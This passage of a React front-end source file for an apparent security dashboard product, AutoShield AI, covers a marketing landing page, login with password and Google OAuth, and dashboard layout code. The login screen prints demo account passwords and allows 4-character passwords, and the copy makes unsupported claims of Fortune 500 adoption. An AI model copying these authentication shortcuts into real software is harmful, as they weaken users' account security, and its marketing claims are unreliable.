              <motion.div key={i} initial={{ opacity: 0, scale: 0.85 }} whileInView={{ opacity: 1, scale: 1 }} viewport={{ once: true }} transition={{ delay: i * 0.06 }} whileHover={{ scale: 1.05, y: -6 }}
                style={{ background: `linear-gradient(135deg, ${a.color}0f, ${a.color}03)`, border: `1px solid ${a.color}25`, borderRadius: 14, padding: '26px 20px', textAlign: 'center', cursor: 'default', position: 'relative', overflow: 'hidden' }}
              >
                <div style={{ position: 'absolute', top: 0, left: 0, right: 0, height: 1, background: `linear-gradient(90deg, transparent, ${a.color}50, transparent)` }} />
                <div style={{ fontSize: 28, marginBottom: 12 }}>{a.icon}</div>
                <div style={{ fontSize: 13, color: 'rgba(255,255,255,0.6)', fontWeight: 600, marginBottom: 10 }}>{a.type}</div>
                <div style={{ fontFamily: 'Anton', fontSize: 24, color: a.color, lineHeight: 1 }}>{a.coverage}</div>
                <div style={{ fontSize: 9, color: 'rgba(255,255,255,0.2)', marginTop: 5, letterSpacing: 1.5 }}>BLOCK RATE</div>
                <div style={{ marginTop: 10, fontSize: 10, color: 'rgba(255,255,255,0.25)', fontFamily: 'monospace' }}>{a.tests} tests passed</div>
              </motion.div>
            ))}
          </div>
        </div>
      </section>

      {/* ── SOCIAL PROOF STATS ── */}
      <section style={{ padding: '100px 0', background: '#09090b', borderTop: '1px solid rgba(255,255,255,0.04)', borderBottom: '1px solid rgba(255,255,255,0.04)' }}>
        <div className="evolve-container">
          <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(170px, 1fr))', gap: 40, textAlign: 'center' }}>
            {[
              { num: blockedThreats.toLocaleString(), label: 'Threats Blocked', color: '#00ff9c' },
              { num: uniqueIPs.toLocaleString(), label: 'Unique IPs Tracked', color: '#38bdf8' },
              { num: '100%', label: 'Local Uptime', color: '#a78bfa' },
              { num: '<1ms', label: 'Engine Latency', color: '#f472b6' },
              { num: engine.getDomains().length.toLocaleString(), label: 'Sites Protected', color: '#fb923c' },
            ].map((s, i) => (
              <motion.div key={i} initial={{ opacity: 0, y: 20 }} whileInView={{ opacity: 1, y: 0 }} viewport={{ once: true }} transition={{ delay: i * 0.1 }}>
                <div style={{ fontFamily: 'Anton', fontSize: 44, color: s.color, lineHeight: 1 }}>{s.num}</div>
                <div style={{ fontSize: 10, color: 'rgba(255,255,255,0.28)', marginTop: 10, letterSpacing: 2.5, textTransform: 'uppercase' }}>{s.label}</div>
              </motion.div>
            ))}
          </div>
        </div>
      </section>

      {/* ── PRICING ── */}
      <section id="pricing" className="evolve-section">
        <div className="evolve-container text-center">
          <motion.div initial={{ opacity: 0, y: 30 }} whileInView={{ opacity: 1, y: 0 }} viewport={{ once: true }} transition={{ duration: 0.8 }}>
            <h3 className="section-title">PREMIUM ACCESS.<br /><span className="text-muted">FOR FREE.</span></h3>
            <p className="section-desc centered mx-auto mb-12" style={{ marginTop: 16 }}>Enterprise-grade infrastructure without the ridiculous price tags. Upgrade when you're ready.</p>
          </motion.div>
          <div className="pricing-grid" style={{ marginTop: 56 }}>
            <motion.div className="pricing-card evolve-interactive" initial={{ opacity: 0, y: 30 }} whileInView={{ opacity: 1, y: 0 }} viewport={{ once: true }} transition={{ delay: 0.1 }}>
              <h5>Community</h5>
              <div className="price">$0<span>/mo</span></div>
              <ul>
                <li>Live Threat Alerts</li>
                <li>Connect up to 3 Sites</li>
                <li>Global Threat Analytics</li>
                <li>Real-time SOC Feed</li>
                <li>Community WAF Rules</li>
              </ul>
              <Link to="/login" className="evolve-btn w-full">Get Started Free</Link>
            </motion.div>
            <motion.div className="pricing-card premium evolve-interactive" initial={{ opacity: 0, y: 30 }} whileInView={{ opacity: 1, y: 0 }} viewport={{ once: true }} transition={{ delay: 0.2 }}>
              <h5>Enterprise</h5>
              <div className="price">$49<span>/mo</span></div>
              <ul>
                <li>Custom WAF Rule Engine</li>
                <li>Dedicated IP Pool</li>
                <li>API &amp; Webhook Integration</li>
                <li>SOC2, PCI-DSS &amp; GDPR Logs</li>
                <li>Priority Edge Routing</li>
                <li>99.99% SLA Guarantee</li>
                <li>Dedicated SOC Engineer</li>
              </ul>
              <Link to="/login" className="evolve-btn-outline w-full">Start Enterprise Trial</Link>
            </motion.div>
          </div>
        </div>
      </section>

      {/* ── FINAL CTA ── */}
      <section style={{ padding: '180px 0', textAlign: 'center', background: 'linear-gradient(180deg, #09090b 0%, #030507 100%)', position: 'relative', overflow: 'hidden' }}>
        <motion.div animate={{ scale: [1, 1.1, 1], opacity: [0.2, 0.5, 0.2] }} transition={{ duration: 8, repeat: Infinity, ease: 'easeInOut' }}
          style={{ position: 'absolute', top: '50%', left: '50%', transform: 'translate(-50%,-50%)', width: 800, height: 800, background: 'radial-gradient(circle, rgba(0,255,156,0.06) 0%, transparent 68%)', borderRadius: '50%', pointerEvents: 'none' }}
        />
        <motion.div animate={{ scale: [1, 1.15, 1], opacity: [0.1, 0.3, 0.1] }} transition={{ duration: 12, repeat: Infinity, ease: 'easeInOut', delay: 3 }}
          style={{ position: 'absolute', top: '50%', left: '50%', transform: 'translate(-50%,-50%)', width: 1200, height: 1200, background: 'radial-gradient(circle, rgba(56,189,248,0.04) 0%, transparent 60%)', borderRadius: '50%', pointerEvents: 'none' }}
        />
        <div className="evolve-container" style={{ position: 'relative', zIndex: 1 }}>
          <motion.div initial={{ opacity: 0, y: 50 }} whileInView={{ opacity: 1, y: 0 }} viewport={{ once: true }} transition={{ duration: 1 }}>
            <div style={{ fontSize: 11, letterSpacing: 4, color: 'rgba(0,255,156,0.7)', fontFamily: 'monospace', marginBottom: 28, textTransform: 'uppercase' }}>Start protecting in 60 seconds</div>
            <h2 style={{ fontFamily: 'Anton', fontSize: 'clamp(48px, 8vw, 110px)', margin: '0 0 28px', lineHeight: 0.95, background: 'linear-gradient(135deg, #ffffff 50%, rgba(255,255,255,0.2))', WebkitBackgroundClip: 'text', WebkitTextFillColor: 'transparent' }}>
              SECURE YOUR<br />BILLION-DOLLAR SITE.
            </h2>
            <p style={{ color: 'rgba(255,255,255,0.28)', fontSize: 17, maxWidth: 520, margin: '0 auto 64px', lineHeight: 1.8 }}>
              Fortune 500 companies, global fintechs, and leading e-commerce platforms trust AutoShield to protect their most critical infrastructure — around the clock, autonomously.
            </p>
            <div style={{ display: 'flex', gap: 16, justifyContent: 'center', flexWrap: 'wrap' }}>
              <Link to="/login" className="evolve-btn" style={{ padding: '22px 72px', fontSize: 14, letterSpacing: 2.5 }}>LAUNCH SOC CONSOLE →</Link>
              <a href="#connect" className="evolve-btn-outline" style={{ padding: '22px 40px', fontSize: 14 }}>Connect Your Site</a>
            </div>
          </motion.div>
        </div>
      </section>

      <footer className="evolve-footer">
        <div className="evolve-container">
          <div className="footer-flex">
            <div>© 2026 AutoShield AI — Enterprise Cybersecurity Platform.</div>
            <div className="footer-links">
              <a href="#">Privacy</a>
              <a href="#">Terms</a>
              <a href="#">Status</a>
              <a href="#">Docs</a>
              <a href="#">Twitter</a>
            </div>
          </div>
        </div>
      </footer>
    </>
  );
}


function Login() {
  const [isSignup, setIsSignup] = useState(false);
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [error, setError] = useState('');
  const [submitting, setSubmitting] = useState(false);
  const [googleLoading, setGoogleLoading] = useState(false);
  const { user, login } = useAuth();
  const navigate = useNavigate();

  // ⚠️ ALL HOOKS MUST BE DECLARED BEFORE ANY EARLY RETURN — React Rules of Hooks
  useEffect(() => {
    // If already logged in, navigate away immediately
    if (user) { navigate('/dashboard', { replace: true }); return; }
    const url = new URL(window.location.href);
    const oauthCode = url.searchParams.get('oauth_code');
    const oauthState = url.searchParams.get('oauth_state');
    const oauthError = url.searchParams.get('oauth_error');

    if (oauthError) {
      setError(`Google OAuth failed: ${oauthError}`);
      url.searchParams.delete('oauth_error');
      window.history.replaceState({}, '', url.pathname + (url.searchParams.toString() ? `?${url.searchParams.toString()}` : ''));
      return;
    }

    if (!oauthCode || !oauthState) return;
    let cancelled = false;

    const completeGoogleLogin = async () => {
      setGoogleLoading(true);
      setError('');
      try {
        const res = await fetch(`${API_URL}/auth/google/exchange`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ code: oauthCode, state: oauthState }),
        });
        if (!res.ok) {
          let detail = 'Google OAuth exchange failed';
          try {
            const data = await res.json();
            detail = data?.detail || detail;
          } catch (_) { }
          throw new Error(detail);
        }
        const data = await res.json();
        engine.connectSSE(data.token);
        const user = {
          ...(data.user || {}),
          tier: data?.context?.tier || data?.user?.tier || 'free',
          authMethod: 'google',
        };
        if (!cancelled) {
          login(user);
          navigate('/dashboard');
        }
      } catch (err) {
        if (!cancelled) setError(err?.message || 'Google OAuth login failed');
      } finally {
        if (!cancelled) setGoogleLoading(false);
      }
    };

    completeGoogleLogin();

    url.searchParams.delete('oauth_code');
    url.searchParams.delete('oauth_state');
    window.history.replaceState({}, '', url.pathname + (url.searchParams.toString() ? `?${url.searchParams.toString()}` : ''));

    return () => {
      cancelled = true;
    };
  }, [user, login, navigate]);

  // Redirect after all hooks if user is already logged in (safe — below all hooks)
  if (user) return <Navigate to="/dashboard" replace />;

  const handleSubmit = async (e) => {
    e.preventDefault();
    setError('');
    setSubmitting(true);

    const normalizedUser = username.trim();
    if (!normalizedUser || !password) {
      setError('Username and password are required.');
      setSubmitting(false);
      return;
    }
    if (password.length < 4) {
      setError('Password must be at least 4 characters.');
      setSubmitting(false);
      return;
    }

    try {
      let user = null;
      if (isSignup) {
        try {
          user = await engine.signup(normalizedUser, password);
        } catch (signupErr) {
          if (String(signupErr?.message || '').toLowerCase().includes('already exists')) {
            user = await engine.authenticate(normalizedUser, password);
          } else {
            throw signupErr;
          }
        }
      } else {
        user = await engine.authenticate(normalizedUser, password);
      }
      if (user) {
        login(user);
        navigate('/dashboard');
      }
    } catch (err) {
      setError(err.message || "An unexpected error occurred.");
    } finally {
      setSubmitting(false);
    }
  };

  const handleGoogleLogin = () => {
    setGoogleLoading(true);
    setError('');
    fetch(`${API_URL}/auth/google/start`)
      .then(async (res) => {
        if (!res.ok) {
          const data = await res.json().catch(() => ({}));
          throw new Error(data?.detail || 'Google OAuth unavailable');
        }
        return res.json();
      })
      .then((data) => {
        if (!data?.auth_url) throw new Error('Google OAuth URL missing');
        window.location.assign(data.auth_url);
      })
      .catch((err) => {
        setError(err?.message || 'Google OAuth is not configured');
        setGoogleLoading(false);
      });
  };

  return (
    <div className="login-page evolve-hero" style={{ height: '100vh', display: 'flex', justifyContent: 'center', alignItems: 'center' }}>
      <MotionDiv
        className="glass-panel"
        style={{ width: '100%', maxWidth: '440px', padding: '40px', transform: 'rotate(0deg)' }}
        initial={{ opacity: 0, scale: 0.95, y: 20 }}
        animate={{ opacity: 1, scale: 1, y: 0 }}
      >
        <div className="window-dots">
          <span></span><span></span><span></span>
        </div>
        <div className="login-brand" style={{ marginBottom: '32px' }}>
          <div style={{ fontSize: '24px', fontWeight: '800', letterSpacing: '-0.04em', color: 'white' }}>
            <span className="brand-dot" style={{ display: 'inline-block', width: '8px', height: '8px', borderRadius: '50%', background: 'var(--e-green)', marginRight: '12px' }}></span>
            AUTOSHIELD
          </div>
          <p style={{ color: 'var(--e-muted)', fontSize: '14px', marginTop: '8px' }}>Secure Terminal Protocol</p>
        </div>

        {/* Google OAuth Button */}
        <button
          onClick={handleGoogleLogin}
          disabled={googleLoading}
          style={{
            width: '100%',
            padding: '14px',
            background: googleLoading ? 'rgba(255,255,255,0.08)' : 'rgba(255,255,255,0.05)',
            border: '1px solid rgba(255,255,255,0.12)',
            borderRadius: 8,
            color: 'white',
            fontSize: 14,
            fontWeight: 600,
            cursor: googleLoading ? 'wait' : 'pointer',
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'center',
            gap: 12,
            marginBottom: 20,
            transition: 'all 0.2s',
          }}
        >
          {googleLoading ? (
            <span style={{ fontFamily: 'var(--mono)', fontSize: 12 }}>Authenticating via OAuth 2.0...</span>
          ) : (
            <>
              <svg width="18" height="18" viewBox="0 0 24 24"><path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92a5.06 5.06 0 0 1-2.2 3.32v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.1z" /><path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" /><path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" /><path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" /></svg>
              Sign in with Google
            </>
          )}
        </button>

        <div style={{ display: 'flex', alignItems: 'center', gap: 16, marginBottom: 20 }}>
          <div style={{ flex: 1, height: 1, background: 'rgba(255,255,255,0.08)' }} />
          <span style={{ fontSize: 10, color: 'var(--muted)', fontFamily: 'var(--mono)', letterSpacing: 2 }}>OR</span>
          <div style={{ flex: 1, height: 1, background: 'rgba(255,255,255,0.08)' }} />
        </div>

        <form className="login-form" onSubmit={handleSubmit}>
          {error && (
            <div className="login-error" style={{ color: 'var(--e-red)', fontSize: '13px', marginBottom: '16px', background: 'rgba(239, 68, 68, 0.1)', padding: '10px', borderRadius: '6px', border: '1px solid rgba(239,68,68,0.25)' }}>
              {error}
              {String(error).toLowerCase().includes('cannot reach api server') && (
                <div style={{ marginTop: 8, color: 'var(--e-muted)', fontSize: 11 }}>
                  Run: <code style={{ color: 'var(--cyan)' }}>python api_layer.py</code>
                </div>
              )}
              {String(error).toLowerCase().includes('google oauth is not configured') && (
                <div style={{ marginTop: 8, color: 'var(--e-muted)', fontSize: 11 }}>
                  Set Google env vars in backend and restart API server.
                </div>
              )}
            </div>
          )}
          <div style={{ marginBottom: '20px' }}>
            <label className="login-label" style={{ display: 'block', fontSize: '12px', color: 'var(--e-muted)', marginBottom: '8px' }}>IDENTITY_KEY</label>
            <input className="input" type="text" placeholder="Enter your username" value={username} onChange={(e) => setUsername(e.target.value)} autoFocus style={{ background: 'rgba(0,0,0,0.4)', borderColor: 'rgba(255,255,255,0.1)' }} />
          </div>
          <div style={{ marginBottom: '32px' }}>
            <label className="login-label" style={{ display: 'block', fontSize: '12px', color: 'var(--e-muted)', marginBottom: '8px' }}>PASSCODE</label>
            <div style={{ position: 'relative' }}>
              <input
                className="input"
                type={showPassword ? 'text' : 'password'}
                placeholder="Enter your password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                style={{ background: 'rgba(0,0,0,0.4)', borderColor: 'rgba(255,255,255,0.1)', paddingRight: '56px' }}
              />
              <button
                type="button"
                onClick={() => setShowPassword((v) => !v)}
                style={{
                  position: 'absolute',
                  right: 10,
                  top: '50%',
                  transform: 'translateY(-50%)',
                  border: '1px solid rgba(255,255,255,0.12)',
                  background: 'rgba(255,255,255,0.04)',
                  color: 'var(--e-muted)',
                  fontSize: 11,
                  padding: '4px 10px',
                  borderRadius: 6,
                  cursor: 'pointer',
                }}
                aria-label={showPassword ? 'Hide password' : 'Show password'}
                title={showPassword ? 'Hide password' : 'Show password'}
              >
                {showPassword ? 'Hide' : 'Show'}
              </button>
            </div>
          </div>
          <button className="evolve-btn" type="submit" disabled={submitting} style={{ width: '100%', display: 'flex', justifyContent: 'space-between', alignItems: 'center', opacity: submitting ? 0.75 : 1, cursor: submitting ? 'wait' : 'pointer' }}>
            <span>{submitting ? 'AUTHENTICATING...' : (isSignup ? 'CREATE ACCOUNT' : 'INITIALIZE')}</span> <span>{submitting ? '⋯' : '→'}</span>
          </button>
        </form>

        <div className="login-footer" style={{ marginTop: '24px', fontSize: '11px', color: 'var(--e-muted)', textAlign: 'left', fontFamily: 'monospace', borderTop: '1px solid rgba(255,255,255,0.05)', paddingTop: '20px' }}>
          <div style={{ marginBottom: 12, display: 'flex', justifyContent: 'center' }}>
            <span style={{ cursor: 'pointer', textDecoration: 'underline' }} onClick={() => { setIsSignup(!isSignup); setError(''); }}>
              {isSignup ? 'Already have an account? Login here' : 'Need an account? Sign up here'}
            </span>
          </div>
          <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 10 }}>
            <div>
              <div style={{ color: '#ffd700', marginBottom: 2 }}>⚡ Premium Demo</div>
              <code>premium.demo / premium123</code>
            </div>
            <div>
              <div style={{ color: 'var(--green)', marginBottom: 2 }}>📦 Free Demo</div>
              <code>free.demo / free123</code>
            </div>
          </div>
        </div>
      </MotionDiv>
    </div>
  );
}

// ═══════════════════════════════════════════════════
// ERROR BOUNDARY — Prevents one tab crash taking down the whole dashboard
// ═══════════════════════════════════════════════════
class TabErrorBoundary extends React.Component {
  constructor(props) {
    super(props);
    this.state = { hasError: false, error: null };
  }
  static getDerivedStateFromError(error) {
    return { hasError: true, error };
  }
  componentDidCatch(error, info) {
    console.error('[AutoShield Tab Error]', error, info);
  }
  render() {
    if (this.state.hasError) {
      return (
        <div style={{ padding: 40, textAlign: 'center', color: 'var(--e-muted)' }}>
          <div style={{ fontSize: 30, marginBottom: 12 }}>⚠️</div>
          <div style={{ fontSize: 14, fontWeight: 700, color: 'var(--red)', marginBottom: 8 }}>Component Error</div>
          <div style={{ fontSize: 11, fontFamily: 'var(--mono)', color: 'var(--muted2)', marginBottom: 16 }}>{String(this.state.error)}</div>
          <button
            onClick={() => this.setState({ hasError: false, error: null })}
            style={{ padding: '8px 20px', background: 'rgba(255,255,255,0.08)', border: '1px solid rgba(255,255,255,0.1)', borderRadius: 6, color: 'white', cursor: 'pointer', fontSize: 11 }}
          >
            Retry
          </button>
        </div>
      );
    }
    return this.props.children;
  }
}

function PremiumLock({ children, featureName, description }) {
  const navigate = useNavigate();
  const isPremium = engine.isPremium();

  if (isPremium) return <>{children}</>;

  return (
    <div style={{ position: 'relative', borderRadius: 12, overflow: 'hidden' }}>
      <div style={{ filter: 'blur(5px)', pointerEvents: 'none', opacity: 0.6 }}>
        {children}
      </div>
      <div style={{
        position: 'absolute', top: 0, left: 0, right: 0, bottom: 0,
        background: 'rgba(5, 10, 20, 0.7)',
        display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center',
        padding: 40, textAlign: 'center', backdropFilter: 'blur(4px)',
        zIndex: 10, border: '1px solid rgba(255,215,0,0.1)'
      }}>
        <div style={{
          width: 48, height: 48, borderRadius: '50%', background: 'rgba(255,215,0,0.1)',
          display: 'flex', alignItems: 'center', justifyContent: 'center', marginBottom: 20,
          border: '1px solid rgba(255,215,0,0.3)', color: '#ffd700'
        }}>
          <HiOutlineLockClosed size={24} />
        </div>
        <h3 style={{ fontSize: 18, fontWeight: 700, margin: '0 0 8px', color: 'white' }}>{featureName || 'Premium Feature'}</h3>
        <p style={{ fontSize: 13, color: 'var(--e-muted)', marginBottom: 24, maxWidth: 300 }}>{description || 'Upgrade to Premium to unlock this advanced enterprise capability.'}</p>
        <button
          onClick={() => navigate('/pricing')}
          className="evolve-btn"
          style={{
            background: 'linear-gradient(135deg, #ffd700, #ff8c00)',
            color: '#000', border: 'none', padding: '10px 24px',
            fontSize: 12, fontWeight: 800, borderRadius: 8
          }}
        >
          UPGRADE TO UNLOCK
        </button>
      </div>
    </div>
  );
}

function Layout() {
  const { user, logout: authLogout } = useAuth();
  const navigate = useNavigate();
  useEngineSnapshot(() => engine.getStateVersion());

  const [showNotifs, setShowNotifs] = useState(false);
  const notifications = engine.getNotifications();
  const recentNotifications = notifications.slice(0, 15);
  const unreadCount = notifications.filter((n) => !n.read).length;

  // ─── Backend-driven lockdown ───────────────────────────────────────────────
  // Reads threatState from backend /stats (via engine.getStats() — stats is not in Layout scope)
  const backendThreatState = engine.getStats()?.threatState || 'NORMAL'; // 'NORMAL' | 'ELEVATED' | 'CRITICAL'
  const [lockdownState, setLockdownState] = useState('none'); // 'none', 'active', 'fixing', 'fixed'
  const [lockdownPulseId, setLockdownPulseId] = useState(0);
  const [prevBackendState, setPrevBackendState] = useState('NORMAL');

  useEffect(() => {
    if (backendThreatState === prevBackendState) return;
    setPrevBackendState(backendThreatState);
    if (backendThreatState === 'CRITICAL' && lockdownState !== 'active') {
      setLockdownState('active');
    } else if (backendThreatState === 'ELEVATED' && lockdownState === 'active') {
      setLockdownState('fixing');
    } else if (backendThreatState === 'NORMAL') {
      if (lockdownState === 'active' || lockdownState === 'fixing') {
        setLockdownState('fixed');
        setTimeout(() => setLockdownState('none'), 5000);
      }
    }
  }, [backendThreatState, lockdownState, prevBackendState]);

  useEffect(() => {
    if (lockdownState === 'active') {
      setLockdownPulseId((v) => v + 1);
    }
  }, [lockdownState]);

  const logout = () => {
    engine.logout();
    authLogout();
    navigate('/login');
  };

  if (!user) return <Navigate to="/login" replace />;

  return (
    <div className={`layout ${lockdownState !== 'none' ? 'lockdown-mode' : ''}`}>
      {lockdownState !== 'none' && (
        <div className="lockdown-overlay">
          <div key={lockdownPulseId} className="lockdown-banner" style={{
            background: lockdownState === 'fixed' ? 'var(--e-green)' : lockdownState === 'fixing' ? 'var(--e-yellow)' : 'var(--e-red)',
            color: lockdownState === 'fixing' ? '#000' : '#fff'
          }}>
            {lockdownState === 'active' && '⚠️ CRITICAL THREAT DETECTED: AUTO-LOCKDOWN ENGAGED ⚠️'}
            {lockdownState === 'fixing' && '⚙️ MITIGATION IN PROGRESS: ANALYZING THREAT SIGNATURES... ⚙️'}
            {lockdownState === 'fixed' && '✅ THREAT NEUTRALIZED: SYSTEM SECURE ✅'}
          </div>
        </div>
      )}

      {/* Toast Notifications Container */}
      <div style={{ position: 'fixed', top: 80, right: 24, zIndex: 10000, display: 'flex', flexDirection: 'column', gap: 12, pointerEvents: 'none' }}>
        <AnimatePresence initial={false} mode="popLayout">
          {notifications.filter(n => n.visible).slice(0, 3).map((notif) => (
            <motion.div
              key={notif.id}
              layout
              initial={{ opacity: 0, x: 80, scale: 0.94, filter: 'blur(4px)' }}
              animate={{ opacity: 1, x: 0, scale: 1, filter: 'blur(0px)' }}
              exit={{ opacity: 0, x: 40, scale: 0.96, filter: 'blur(3px)' }}
              transition={{ type: 'spring', stiffness: 340, damping: 28, mass: 0.5 }}
              style={{
                background: 'rgba(8,11,16,0.95)',
                backdropFilter: 'blur(12px)',
                border: `1px solid ${notif.severity === 'critical' ? 'rgba(239,68,68,0.5)' : notif.severity === 'high' ? 'rgba(249,115,22,0.5)' : notif.severity === 'success' ? 'rgba(34,197,94,0.5)' : 'rgba(0,255,156,0.3)'}`,
                padding: '16px', borderRadius: '8px', width: '320px', pointerEvents: 'auto',
                boxShadow: '0 10px 30px rgba(0,0,0,0.5)',
                overflow: 'hidden'
              }}
            >
              <div style={{ fontSize: 13, fontWeight: 700, marginBottom: 4, display: 'flex', justifyContent: 'space-between' }}>
                <span style={{ color: notif.severity === 'critical' ? 'var(--red)' : notif.severity === 'high' ? 'var(--orange)' : notif.severity === 'success' ? 'var(--green)' : 'var(--cyan)' }}>{notif.title}</span>
                <span style={{ fontSize: 10, color: 'var(--e-muted)', fontWeight: 400 }}>
                  {(() => {
                    const diffMs = Date.now() - new Date(notif.timestamp).getTime();
                    if (diffMs < 10000) return 'just now';
                    if (diffMs < 60000) return `${Math.floor(diffMs / 1000)}s ago`;
                    if (diffMs < 3600000) return `${Math.floor(diffMs / 60000)}m ago`;
                    return `${Math.floor(diffMs / 3600000)}h ago`;
                  })()}
                </span>
              </div>
              <div style={{ fontSize: 11, color: 'var(--e-text)', lineHeight: 1.4 }}>{notif.message}</div>
              <motion.div
                initial={{ width: '100%' }}
                animate={{ width: '0%' }}
                transition={{ duration: 4.8, ease: 'linear' }}
                style={{ height: 2, marginTop: 10, background: notif.severity === 'critical' ? 'var(--red)' : notif.severity === 'high' ? 'var(--orange)' : notif.severity === 'success' ? 'var(--green)' : 'var(--cyan)', opacity: 0.8 }}
              />
            </motion.div>
          ))}
        </AnimatePresence>
      </div>

      <aside className="sidebar" style={{ background: 'var(--e-bg)', borderRight: '1px solid rgba(255,255,255,0.05)', display: 'flex', flexDirection: 'column', zIndex: 10 }}>
        <div className="sidebar-brand" style={{ padding: '32px 24px', borderBottom: '1px solid rgba(255,255,255,0.05)' }}>
          <div className="sidebar-brand-text" style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
            <span className="brand-dot" style={{ width: '8px', height: '8px', borderRadius: '50%', background: 'var(--e-green)' }}></span>
            <h2 style={{ fontFamily: 'Anton', letterSpacing: '-0.02em', fontSize: '24px', margin: 0, background: 'linear-gradient(180deg, #fff 0%, #aaa 100%)', WebkitBackgroundClip: 'text', WebkitTextFillColor: 'transparent' }}>AUTOSHIELD</h2>
          </div>
        </div>

        {user && (
          <div className="sidebar-user">
            <div className="sidebar-user-label">SIGNED IN {user.authMethod === 'google' ? '(Google)' : ''}</div>
            <div className="sidebar-user-name">{user.name || user.username}</div>
            <div className="sidebar-user-email">{user.email}</div>
            <div style={{ marginTop: 8, display: 'flex', gap: 6 }}>
              {engine.isPremium() ? (
                <span style={{ fontSize: 9, fontWeight: 700, padding: '3px 10px', borderRadius: 4, background: 'linear-gradient(135deg, rgba(255,215,0,0.15), rgba(255,165,0,0.15))', border: '1px solid rgba(255,215,0,0.3)', color: '#ffd700', letterSpacing: 1.5, fontFamily: 'var(--mono)', boxShadow: '0 0 12px rgba(255,215,0,0.15)' }}>⭐ PREMIUM</span>
              ) : (
                <span style={{ fontSize: 9, fontWeight: 700, padding: '3px 10px', borderRadius: 4, background: 'rgba(255,255,255,0.04)', border: '1px solid rgba(255,255,255,0.08)', color: 'var(--muted)', letterSpacing: 1.5, fontFamily: 'var(--mono)' }}>FREE TIER</span>
              )}
            </div>
          </div>
        )}

        <div className="sidebar-section">Navigation</div>
        <nav className="sidebar-nav">
          {[
            { to: '/dashboard', label: 'Fusion Dashboard', icon: <HiShieldCheck /> },
            { to: '/live-soc', label: 'Live SOC', icon: <HiOutlineBolt /> },
            { to: '/attack-geo', label: 'Attack Geography', icon: <HiOutlineGlobeAlt /> },
            { to: '/threat-intel', label: 'Threat Intelligence', icon: <HiOutlineCpuChip /> },
            { to: '/ops-reports', label: 'Operations & Reports', icon: <HiOutlineDocumentText /> },
            { to: '/my-websites', label: 'My Websites', icon: <HiOutlineGlobeAlt /> },
            { to: '/activity', label: 'Activity', icon: <HiOutlineDocumentText /> },
          ].map((item) => (
            <NavLink key={item.to} to={item.to} className={({ isActive }) => `sidebar-link ${isActive ? 'active' : ''}`}>
              <span className="sidebar-link-icon">{item.icon}</span>
              {item.label}
            </NavLink>
          ))}
        </nav>

        <div className="sidebar-bottom">
          <div className="sidebar-section" style={{ marginBottom: 6, marginTop: 0, paddingTop: 0 }}>Protection</div>
          <NavLink to="/setup" className={({ isActive }) => `sidebar-link ${isActive ? 'active' : ''}`} style={{ marginBottom: 4 }}>
            <span className="sidebar-link-icon"><HiServer /></span>
            Add Website
          </NavLink>
          <NavLink to="/pricing" className={({ isActive }) => `sidebar-link ${isActive ? 'active' : ''}`} style={{ marginBottom: 8 }}>
            <span className="sidebar-link-icon">💎</span>
            {engine.isPremium() ? 'My Plan' : 'Upgrade Plan'}
          </NavLink>
          <button className="sidebar-logout" onClick={logout}>
            <HiArrowRightOnRectangle /> Logout
          </button>
        </div>
      </aside>

      <div className="main" style={{ background: 'var(--e-bg)' }}>
        <header className="topnav" style={{ background: 'rgba(0,0,0,0.5)', backdropFilter: 'blur(12px)', borderBottom: '1px solid rgba(255,255,255,0.05)' }}>
          <div className="topnav-search" style={{ border: '1px solid rgba(255,255,255,0.1)', background: 'transparent' }}>
            <HiOutlineMagnifyingGlass style={{ color: 'var(--e-muted)' }} />
            <input placeholder="Search IPs, domains, CVEs..." style={{ color: 'white', background: 'transparent' }} />
          </div>
          <div className="topnav-right" style={{ position: 'relative' }}>
            {engine.isAutoPilotActive() ? (
              <button className="btn-autopilot-halt" onClick={() => engine.stopAutoPilot()}>
                <span style={{ display: 'inline-block', width: 6, height: 6, borderRadius: '50%', background: 'var(--e-red)', animation: 'pulse-dot 1s infinite' }}></span> HALT AUTOPILOT
              </button>
            ) : (
              <button className="btn-autopilot-engage" onClick={() => engine.startAutoPilot()}>
                <span style={{ display: 'inline-block', width: 6, height: 6, borderRadius: '50%', background: 'var(--e-green)' }}></span> ENGAGE AUTOPILOT
              </button>
            )}

            <div style={{ position: 'relative' }}>
              <button
                className="evolve-btn-outline"
                style={{ padding: '8px 16px', fontSize: '13px', position: 'relative' }}
                onClick={() => { setShowNotifs(!showNotifs); if (!showNotifs) engine.markAllRead(); }}
              >
                <HiOutlineBell /> Alerts
                {unreadCount > 0 && (
                  <span style={{ position: 'absolute', top: -5, right: -5, background: 'var(--red)', color: 'white', fontSize: 10, padding: '2px 6px', borderRadius: 10, fontWeight: 'bold' }}>{unreadCount}</span>
                )}
              </button>

              {showNotifs && (
                <div style={{ position: 'absolute', top: '100%', right: 0, marginTop: 12, width: 350, background: 'rgba(20,20,22,0.95)', border: '1px solid rgba(255,255,255,0.1)', borderRadius: 12, backdropFilter: 'blur(20px)', zIndex: 100, overflow: 'hidden', boxShadow: '0 20px 40px rgba(0,0,0,0.5)' }}>
                  <div style={{ padding: '16px', borderBottom: '1px solid rgba(255,255,255,0.05)', display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                    <div style={{ fontSize: 13, fontWeight: 700 }}>System Notifications</div>
